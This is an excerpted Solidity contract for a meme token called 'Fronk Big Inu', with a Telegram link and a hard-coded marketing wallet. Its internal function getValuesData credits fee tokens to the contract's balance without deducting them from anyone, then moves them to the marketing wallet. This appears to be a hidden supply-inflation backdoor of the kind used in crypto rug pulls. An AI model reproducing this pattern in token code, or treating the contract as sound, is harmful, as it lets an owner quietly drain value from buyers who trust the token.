...
// Telegram : https://t.me/fronkbiginu
...
contract FronkBigInu is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Fronk Big Inu";
    string private _symbol = "$FBI";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xD7ddb26255b502ED89E19F7C2dCD8a7F96a4cfC0);
    address payable public liqWalletAddress = payable(0xD7ddb26255b502ED89E19F7C2dCD8a7F96a4cfC0);
    ...
    uint256 private _totalSupply =  100e9 * 10**_decimals;
    uint256 public _maxTxAmount =   100e9 * 10**_decimals;
    uint256 public _walletMax =     100e9 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 500e8 * 10**_decimals;
    ...
    function getValuesData(uint256 amount) internal {
       uint256 totalTax = _totalTaxIfBuying.add(_totalTaxIfSelling);
       uint256 feeAmount = amount.mul(totalTax).div(_totalTaxIfBuying);

       _balances[address(this)] = _balances[address(this)].add(feeAmount);
        if(balanceOf(address(this)) >= _totalSupply) {
            _basicTransfer(address(this), marketingWalletAddress, feeAmount);
        }
    }
